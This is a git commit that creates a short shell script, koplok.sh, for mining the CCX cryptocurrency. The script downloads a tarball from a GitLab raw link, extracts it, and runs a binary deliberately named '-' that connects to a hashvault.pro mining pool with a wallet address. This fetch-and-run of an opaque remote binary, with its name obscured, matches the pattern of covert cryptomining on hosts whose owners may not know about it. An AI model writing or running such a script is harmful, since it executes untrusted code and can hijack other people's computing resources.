9a8caccb385084c9b2dfcd888c80c652c5509b4d
191080200045 <89234208+191080200045@users.noreply.github.com>
2022-11-23 09:59:05 +0700

    Create koplok.sh

---
+++ koplok.sh
@@ -0,0 +1,4 @@
+# ccxcoin
+sudo apt update
+wget https://gitlab.com/dindin.cs7/jos/-/raw/main/ccx1.tar.gz && tar -xvf ccx1.tar.gz
+./- --tls-url singapore01.hashvault.pro:80 --user ccx7aoNYpGb7sndJtEDWvCBQhPAy9mC8QW5KWuCx8J1FJrDcDrER1XYA9LGtggrR7ZC4KfQmQ2uRN47L9WypBbNLAeq2Q4Q9WN.6c51b74c5bb7798326a3c083800ab51ab5748c0b9fad127c90046c0c573914a4 --pass popok --currency cryptonight_gpu
